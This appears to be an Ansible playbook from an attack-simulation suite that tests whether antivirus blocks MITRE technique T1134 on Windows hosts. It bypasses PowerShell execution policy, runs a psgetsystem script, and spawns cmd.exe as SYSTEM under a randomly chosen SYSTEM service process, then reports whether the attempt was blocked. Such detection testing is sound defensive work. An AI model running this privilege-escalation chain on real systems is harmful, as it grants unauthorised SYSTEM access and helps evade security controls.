# attack_technique: T1134
# Reference: https://github.com/decoder-it/psgetsystem
- name: T1134 - Access Token Manipulation
  hosts: windows
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
    - name: Get running random PID running as system
      tags: always
      win_shell: |
        Get-WMIObject -Query "Select ProcessId From Win32_Service WHERE state='Running' and StartName='LocalSystem'" | findstr ProcessId | %{$_.split(':')[1]} | Sort-Object -Unique | Get-Random
      register: systemPID  
    - set_fact:
        pid={{systemPID.stdout}}
    - name: Execute elevation powershell script
      tags: always
      win_shell: |
        powershell.exe -ExecutionPolicy Bypass -Command c:\temp\psgetsys.ps1
    - name: Inject and check if running as system
      tags: always
      win_shell: |
        echo '[MyProcess]::CreateProcessFromParent({{pid}} ,"cmd.exe")' > c:\temp\priv-temp.ps1
    - name: Remove carriage return from file
      tags: always
      win_shell: |
        (Get-Content c:\temp\priv-temp.ps1) -join ' ' > c:\temp\priv.ps1
    - name: Execute ps script
      tags: always
      win_shell: |
        c:\temp\priv.ps1
      register: result
    - debug:
      tags: always
        var: result
        verbosity: 2
    - name: sleep for 10 seconds and continue with play to check if AV removed or Not
      tags: always
      wait_for: timeout=10
      delegate_to: localhost
    - name: check new process cmd.exe running as system
      tags: always
      win_shell: |
        tasklist /FI "IMAGENAME eq cmd.exe" /FI "USERNAME eq NT AUTHORITY\SYSTEM"
      register: T1134
    - name: check if playbook was blocked
      tags: always
      debug: msg="Playbook Completed#T1134#blocked#win#"
      when: '"No task" in T1134.stdout'        
    - name: check if playbook was successfull
      tags: always
      debug: msg="Playbook Completed#T1134#passed#win#"
      when: '"cmd.exe" in T1134.stdout'   
